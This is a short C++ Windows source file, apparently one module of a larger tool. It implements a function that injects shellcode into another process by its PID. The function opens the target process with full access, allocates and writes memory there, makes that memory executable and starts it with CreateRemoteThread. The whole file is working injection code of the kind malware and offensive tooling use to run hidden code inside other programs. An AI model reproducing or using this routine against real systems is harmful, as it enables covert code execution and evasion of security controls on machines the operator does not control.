#include <windows.h>
#include "../../Utils/logger.h"
#include "../../Utils/utilities.h"
#include "ExecHeap.h"

BOOL WriteAndExec(DWORD pid, LPCSTR shellcode, SIZE_T size) {
  Logger& logger = Logger::getInstance();

#ifdef DEBUG
  LOG_CALL("pid = %lu, shellcode = %p, size = %lu", pid, shellcode, size);
#endif

  HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
  if (processHandle == NULL) {
    LOG_ERROR("Opening a handle failed.");
    return FALSE;
  }

  LPVOID remoteAddress = VirtualAllocEx(processHandle, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (remoteAddress == NULL) {
    CloseHandle(processHandle);
    LOG_ERROR("Memory allocation failed.");
    return FALSE;
  }

  if (!WriteProcessMemory(processHandle, remoteAddress, shellcode, size, NULL)) {
    VirtualFreeEx(processHandle, remoteAddress, 0, MEM_RELEASE);
    CloseHandle(processHandle);
    LOG_ERROR("Writing to process memory failed.");
    return FALSE;
  }

  DWORD oldProtect;
  if (!VirtualProtectEx(processHandle, remoteAddress, size, PAGE_EXECUTE_READ, &oldProtect)) {
    VirtualFreeEx(processHandle, remoteAddress, 0, MEM_RELEASE);
    CloseHandle(processHandle);
    LOG_ERROR("Protection change failed.");
    return FALSE;
  }

  LPTHREAD_START_ROUTINE threadStart = (LPTHREAD_START_ROUTINE)remoteAddress;
  HANDLE threadHandle = CreateRemoteThread(processHandle, NULL, 0, threadStart, NULL, 0, NULL);

  if (threadHandle == NULL) {
    VirtualFreeEx(processHandle, remoteAddress, 0, MEM_RELEASE);
    CloseHandle(processHandle);
    LOG_ERROR("Thread creation failed.");
    return FALSE;
  }

  CloseHandle(threadHandle);
  CloseHandle(processHandle);

  return TRUE;
}
